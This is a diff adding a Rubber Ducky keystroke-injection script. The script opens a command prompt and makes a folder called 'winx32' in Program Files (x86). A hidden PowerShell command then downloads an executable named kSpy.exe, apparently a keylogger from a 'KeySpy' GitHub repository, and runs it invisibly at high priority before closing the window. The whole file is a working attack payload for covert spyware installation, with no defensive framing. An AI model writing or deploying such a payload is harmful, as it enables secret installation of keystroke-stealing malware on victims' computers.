@@ -1,0 +1,25 @@
+REM Rubber Ducky payload to create a folder named "winx32" and execute a command without opening any terminal window
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd C:\Program Files (x86)
+DELAY 500
+ENTER
+DELAY 500
+STRING mkdir winx32
+DELAY 500
+ENTER
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/src/gl0bal/kSpy.exe', 'C:\Program Files (x86)\winx32\kSpy.exe'); Start-Process 'C:\Program Files (x86)\winx32\kSpy.exe' -WindowStyle Hidden -Priority High"
+DELAY 500
+ENTER
+DELAY 1000
+ALT SPACE
+DELAY 500
+STRING c
+DELAY 500
